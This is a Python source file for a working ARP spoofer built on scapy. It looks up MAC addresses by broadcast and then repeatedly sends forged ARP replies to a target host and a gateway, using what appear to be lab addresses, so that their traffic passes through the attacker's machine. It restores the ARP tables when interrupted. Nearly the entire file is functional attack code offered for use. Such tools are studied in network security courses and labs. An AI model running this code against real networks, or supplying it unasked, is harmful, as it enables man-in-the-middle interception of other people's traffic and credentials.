import time
from scapy.all import srp, send
from scapy.layers.l2 import ARP, Ether

def menu():
    '''
        Generic console output header for arp spoofer
    '''
    print("------------------------------------------")
    print("|              ARP SPOOFER               |")
    print("------------------------------------------")

def get_mac(ip):
    '''
        Performs ARP scan on target IP or IP range

        Parameters:
            ip - target IP or IP range

        Returns:
            MAC address of target ip
    '''
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    '''
        Performs ARP spoof on target IP

        Parameters:
            target_ip - target IP to spoof
            spoof_ip - IP addr that will be impersonated
    '''
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(dest_ip, src_ip):
    '''
        Restore ARP Tables

        Parameters:
            dest_ip - destination IP address 
            src_ip - source IP address
    '''
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    sent_packets = 0
    target_ip = '10.0.2.4'
    gateway_ip = '10.0.2.1'

    menu()
    while True:
        try:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets += 2
            print(f"\r[+] Packets sent: {sent_packets}", end='', flush=True)
            time.sleep(5)
        except KeyboardInterrupt:
            print("\n[+] Detected Keyboard Interrupt. Resetting ARP table...")
            restore(target_ip, gateway_ip)
            restore(gateway_ip, target_ip)
            break
